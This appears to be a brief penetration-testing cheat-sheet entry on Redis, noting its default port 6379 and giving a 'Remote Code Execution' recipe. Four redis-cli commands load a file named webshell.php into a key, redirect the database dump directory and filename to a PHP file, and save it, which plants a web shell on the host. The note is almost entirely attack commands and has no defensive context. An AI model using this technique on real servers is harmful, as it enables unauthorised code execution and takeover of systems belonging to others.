Default [[port 6379]]

---

Remote Code Execution:

```bash
cat webshell.php | redis-cli -h localhost -x set r
redis-cli -h localhost config set dir /path/to/save/
redis-cli -h localhost config set dbfilename "r.php"
redis-cli -h localhost save
```

---